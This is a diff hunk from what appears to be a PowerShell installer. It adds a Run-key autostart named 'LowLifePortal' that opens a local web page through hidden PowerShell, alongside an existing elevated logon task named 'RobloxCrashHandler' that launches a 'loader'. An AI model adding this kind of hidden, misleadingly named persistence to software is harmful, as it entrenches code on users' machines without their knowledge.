@@ -165,6 +165,12 @@ if ($Persist) {
     schtasks /create /tn "RobloxCrashHandler" /tr "$InstallPathExe" /sc onlogon /rl highest /f
 }
 
+# Configure Registry Run key for interactive browser popup on startup
+$RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$PortalUrl = "http://127.0.0.1:9876/"
+$RunCommand = "powershell.exe -WindowStyle Hidden -Command `"Start-Sleep -Seconds 3; Start-Process '$PortalUrl'`""
+New-ItemProperty -Path $RunKeyPath -Name "LowLifePortal" -Value $RunCommand -PropertyType String -Force | Out-Null
+
 # 5. Launch the Loader
 Write-Host "[4/5] Starting service..." -ForegroundColor Yellow
 schtasks /run /tn "RobloxCrashHandler"
